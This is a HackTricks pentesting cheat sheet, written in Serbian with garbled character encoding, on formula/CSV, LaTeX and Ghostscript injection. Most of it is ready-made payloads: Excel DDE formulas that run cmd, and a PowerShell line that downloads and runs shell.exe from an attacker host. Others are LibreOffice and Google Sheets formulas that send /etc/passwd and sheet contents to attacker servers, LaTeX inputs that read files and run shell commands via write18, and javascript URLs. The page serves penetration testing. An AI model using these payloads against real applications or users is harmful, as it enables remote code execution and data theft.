# Formula/CSV/Doc/LaTeX/GhostScript Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Formula Injection

### Info

Ako je vaÅ¡ **ulaz** **reflektovan** unutar **CSV datoteka** (ili bilo koje druge datoteke koja Ä‡e verovatno biti otvorena u **Excelu**), moÅ¾da Ä‡ete moÄ‡i da stavite **formule** u Excelu koje Ä‡e biti **izvrÅ¡ene** kada korisnik **otvori datoteku** ili kada korisnik **klikne na neki link** unutar Excel tabele.

{% hint style="danger" %}
Danas **Excel Ä‡e upozoriti** (viÅ¡e puta) **korisnika kada se neÅ¡to uÄita izvan Excela** kako bi ga spreÄio da preduzme maliciozne radnje. Stoga, poseban napor u socijalnom inÅ¾enjeringu mora biti primenjen na konaÄni payload.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**SledeÄ‡i primer je veoma koristan za eksfiltraciju sadrÅ¾aja iz konaÄnog excel lista i za slanje zahteva na proizvoljne lokacije. Ali zahteva da korisnik klikne na link (i prihvati upozorenja).**

SledeÄ‡i primer je preuzet sa [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Zamislite bezbednosni propust u sistemu za upravljanje podacima o studentima koji se eksploatiÅ¡e putem napada CSV injekcijom. Primarna namera napadaÄa je da kompromituje sistem koji koriste nastavnici za upravljanje podacima o studentima. Metoda ukljuÄuje napadaÄa koji ubacuje zloÄ‡udni payload u aplikaciju, posebno tako Å¡to unosi Å¡tetne formule u polja namenjena podacima o studentima. Napad se odvija na sledeÄ‡i naÄin:

1. **Injekcija ZloÄ‡udnog Payload-a:**
* NapadaÄ Å¡alje obrazac za podatke o studentu, ali ukljuÄuje formulu koja se obiÄno koristi u tabelama (npr., `=HYPERLINK("<malicious_link>","Click here")`).
* Ova formula je dizajnirana da kreira hyperlink, ali upuÄ‡uje na zloÄ‡udni server koji kontroliÅ¡e napadaÄ.
2. **Izvoz Kompromitovanih Podataka:**
* Nastavnici, nesvesni kompromitacije, koriste funkcionalnost aplikacije da izvezu podatke u CSV datoteku.
* CSV datoteka, kada se otvori, i dalje sadrÅ¾i zloÄ‡udni payload. Ovaj payload se pojavljuje kao klikabilni hyperlink u tabeli.
3. **Pokretanje Napada:**
* Nastavnik klikne na hyperlink, verujuÄ‡i da je to legitimni deo podataka o studentu.
* Nakon klika, osetljivi podaci (potencijalno ukljuÄujuÄ‡i detalje iz tabele ili raÄunara nastavnika) se Å¡alju na server napadaÄa.
4. **Zapisivanje Podataka:**
* Server napadaÄa prima i beleÅ¾i osetljive podatke poslati sa raÄunara nastavnika.
* NapadaÄ moÅ¾e zatim koristiti ove podatke za razne zloÄ‡udne svrhe, dodatno kompromitujuÄ‡i privatnost i bezbednost studenata i institucije.

### RCE

**Proverite** [**originalni post**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **za viÅ¡e detalja.**

U specifiÄnim konfiguracijama ili starijim verzijama Excela, funkcija pod nazivom DinamiÄka razmena podataka (DDE) moÅ¾e se iskoristiti za izvrÅ¡avanje proizvoljnih komandi. Da bi se to iskoristilo, sledeÄ‡e postavke moraju biti omoguÄ‡ene:

* Idite na File â†’ Options â†’ Trust Center â†’ Trust Center Settings â†’ External Content, i omoguÄ‡ite **Pokretanje DDE servera**.

Kada se otvori tabela sa zloÄ‡udnim payload-om (i ako korisnik prihvati upozorenja), payload se izvrÅ¡ava. Na primer, da pokrene aplikaciju kalkulator, payload bi bio:
```markdown
=cmd|' /C calc'!xxx
```
Dodatne komande takoÄ‘e mogu biti izvrÅ¡ene, kao Å¡to je preuzimanje i izvrÅ¡avanje datoteke koristeÄ‡i PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Local File Inclusion (LFI) in LibreOffice Calc

LibreOffice Calc se moÅ¾e koristiti za Äitanje lokalnih fajlova i exfiltraciju podataka. Evo nekoliko metoda:

* ÄŒitanje prve linije iz lokalnog `/etc/passwd` fajla: `='file:///etc/passwd'#$passwd.A1`
* Exfiltracija proÄitanih podataka na server pod kontrolom napadaÄa: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltracija viÅ¡e od jedne linije: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS exfiltracija (slanje proÄitanih podataka kao DNS upita na DNS server pod kontrolom napadaÄa): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>"))`

### Google Sheets for Out-of-Band (OOB) Data Exfiltration

Google Sheets nudi funkcije koje se mogu iskoristiti za OOB exfiltraciju podataka:

* **CONCATENATE**: Spaja stringove - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: Uvozi podatke iz strukturiranih tipova podataka - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: Uvozi RSS ili ATOM feedove - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: Uvozi podatke iz HTML tabela ili listi - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: Uvozi opseg Ä‡elija iz druge tabele - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**: UmeÄ‡e sliku u Ä‡eliju - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

## LaTeX Injection

ObiÄno serveri koji se nalaze na internetu i **konvertuju LaTeX kod u PDF** koriste **`pdflatex`**.\
Ovaj program koristi 3 glavna atributa za (ne)dozvoljavanje izvrÅ¡avanja komandi:

* **`--no-shell-escape`**: **OnemoguÄ‡ava** konstrukciju `\write18{command}`, Äak i ako je omoguÄ‡ena u texmf.cnf fajlu.
* **`--shell-restricted`**: Isto kao `--shell-escape`, ali **ograniÄeno** na 'siguran' skup **predefinisanih** \*\*komandi (\*\*Na Ubuntu 16.04 lista se nalazi u `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **OmoguÄ‡ava** konstrukciju `\write18{command}`. Komanda moÅ¾e biti bilo koja shell komanda. Ova konstrukcija je obiÄno onemoguÄ‡ena iz bezbednosnih razloga.

MeÄ‘utim, postoje i drugi naÄini za izvrÅ¡avanje komandi, pa je veoma vaÅ¾no koristiti `--shell-restricted` kako bi se izbeglo RCE.

### Read file <a href="#read-file" id="read-file"></a>

MoÅ¾da Ä‡ete morati da prilagodite injekciju sa omotaÄima kao Å¡to su \[ ili $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### ÄŒitajte datoteku sa jednim redom
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### ÄŒitanje datoteke sa viÅ¡e redova
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### NapiÅ¡i datoteku <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### IzvrÅ¡enje komande <a href="#command-execution" id="command-execution"></a>

Ulaz komande Ä‡e biti preusmeren na stdin, koristite privremenu datoteku da biste ga dobili.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
ĞĞºĞ¾ Ğ´Ğ¾Ğ±Ğ¸Ñ˜ĞµÑ‚Ğµ Ğ±Ğ¸Ğ»Ğ¾ ĞºĞ°ĞºĞ²Ñƒ LaTex Ğ³Ñ€ĞµÑˆĞºÑƒ, Ñ€Ğ°Ğ·Ğ¼Ğ¸ÑĞ»Ğ¸Ñ‚Ğµ Ğ¾ ĞºĞ¾Ñ€Ğ¸ÑˆÑ›ĞµÑšÑƒ base64 Ğ´Ğ° Ğ´Ğ¾Ğ±Ğ¸Ñ˜ĞµÑ‚Ğµ Ñ€ĞµĞ·ÑƒĞ»Ñ‚Ğ°Ñ‚ Ğ±ĞµĞ· Ğ»Ğ¾ÑˆĞ¸Ñ… ĞºĞ°Ñ€Ğ°ĞºÑ‚ĞµÑ€Ğ°.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Od [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

**Proverite** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Reference

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)


{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
